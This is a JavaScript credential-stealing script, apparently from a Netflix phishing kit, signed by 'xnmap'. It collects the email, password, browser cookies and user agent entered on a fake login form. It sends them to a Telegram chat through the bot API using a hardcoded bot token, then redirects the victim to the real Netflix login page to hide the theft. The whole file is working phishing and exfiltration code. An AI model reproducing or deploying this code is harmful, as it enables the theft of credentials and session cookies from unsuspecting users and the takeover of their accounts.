//programmer xnmap
var telegram_bot_id = "5556591440:AAHaL_M8pUe3UIIZ1Up0C4O1jseeTd1knYo"; 
var chat_id = -1001633253754; 
var u_name, email, message;
var ready = function() {
 //   u_name = document.getElementById("name").value;
    email = document.getElementById("email").value;
    pass = document.getElementById("message").value;
    var ipadd = document.cookie;
    var phone = navigator.userAgent;
    sendx = "\n👨🏻‍💻target:1" + "\n🤩Email: " + email + "\n🤩pass🔐: " + pass + "\n💎=====================💎"+"\n 🆔️cookie:"+ ipadd + "\n 💎=====================💎" +"\n ➡️system:"+ phone;
    
};
var xnmap = function() {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": sendx
        })
    };
    
    $.ajax(settings).done(function(response) {
        console.log(response);
    });
    
    location=("https://www.netflix.com/ma-en/login");
  //  document.getElementById("name").value = "";
    document.getElementById("email").value = "";
    document.getElementById("message").value = "";
    
    return false;
    
  
};

  
